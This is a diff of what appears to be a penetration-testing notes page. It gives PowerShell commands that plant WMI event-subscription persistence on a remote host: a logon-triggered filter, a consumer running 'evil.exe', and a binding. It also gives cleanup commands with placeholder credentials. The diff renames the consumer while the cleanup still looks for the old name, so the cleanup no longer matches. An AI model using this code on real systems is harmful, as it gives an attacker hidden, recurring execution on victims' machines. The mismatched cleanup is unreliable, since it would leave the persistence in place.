@@ -226,34 +226,30 @@ $Session = New-CimSession -ComputerName "TARGET" -SessionOption (New-CimSessionO
 #Create filter
 #Query to execute payload within 60 seconds every time Windows starts:
 #SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325
-$FilterArgs = @{name='v4resk-WMI';
-                EventNameSpace='root\CimV2';
-                QueryLanguage="WQL";
-                Query="SELECT * FROM __InstanceCreationEvent Within 5 Where TargetInstance Isa 'Win32_LogonSession'"};
-$Filter = New-CimInstance -CimSession $Session -Namespace root/subscription -ClassName __EventFilter -Property $FilterArgs
+$FilterArgs = @{name='v4resk-WMI'; EventNameSpace='root\CimV2'; QueryLanguage="WQL"; Query="SELECT * FROM __InstanceCreationEvent Within 5 Where TargetInstance Isa 'Win32_LogonSession'"};
+$Filter=New-CimInstance -CimSession $Session -Namespace root/subscription -ClassName __EventFilter -Property $FilterArgs
 
 #Create consumer
-$ConsumerArgs = @{name='v4resk-WMI';
-                CommandLineTemplate="$($Env:SystemRoot)\System32\evil.exe";}
+$ConsumerArgs = @{name='WMIPersist'; CommandLineTemplate="$($Env:SystemRoot)\System32\evil.exe";}
 $Consumer=New-CimInstance -CimSession $Session -Namespace root/subscription -ClassName CommandLineEventConsumer -Property $ConsumerArgs
 
 #Create cosnmerBinding (bind filter & consumer)
-$FilterToConsumerArgs = @{
-Filter = [Ref] $Filter;
-Consumer = [Ref] $Consumer;
-}
+$FilterToConsumerArgs = @{Filter = [Ref] $Filter; Consumer = [Ref] $Consumer;}
 $FilterToConsumerBinding = New-CimInstance -CimSession $Session -Namespace root/subscription -ClassName __FilterToConsumerBinding -Property $FilterToConsumerArgs
 ```
 
 We can cleanup using following commands
 
 ```powershell
+#Create CimSession
 $credential = (new-object -typename System.Management.Automation.PSCredential -ArgumentList @("USERNAME", (ConvertTo-SecureString -String "PASSW0RD" -asplaintext -force)))
 
+#Get Consumer,Filter,$FilterConsumerBinding
 $EventConsumerToCleanup = Get-WmiObject -ComputerName "TARGET" -Credential $credential -Namespace root/subscription -Class CommandLineEventConsumer -Filter "Name = 'v4resk-WMI'"
 $EventFilterToCleanup = Get-WmiObject -ComputerName "TARGET" -Credential $credential -Namespace root/subscription -Class __EventFilter -Filter "Name = 'v4resk-WMI'"
 $FilterConsumerBindingToCleanup = Get-WmiObject -ComputerName "TARGET" -Credential $credential -Namespace root/subscription -Query "REFERENCES OF {$($EventConsumerToCleanup.__RELPATH)} WHERE ResultClass = __FilterToConsumerBinding"
- 
+
+#Remove
 $FilterConsumerBindingToCleanup | Remove-WmiObject
 $EventConsumerToCleanup | Remove-WmiObject
 $EventFilterToCleanup | Remove-WmiObject
